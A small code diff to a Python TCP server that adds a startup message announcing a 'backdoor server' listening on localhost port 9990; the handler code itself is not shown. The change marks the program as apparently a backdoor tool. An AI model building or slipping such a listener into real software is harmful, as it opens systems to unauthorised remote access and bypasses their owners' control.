@@ -104,6 +104,7 @@ class TCPHandler(socketserver.BaseRequestHandler):
             return output
 
 if __name__ == "__main__":
+    print("Starting backdoor server")
     HOST, PORT = "localhost", 9990
     server = socketserver.TCPServer((HOST, PORT), TCPHandler)
     server.serve_forever()
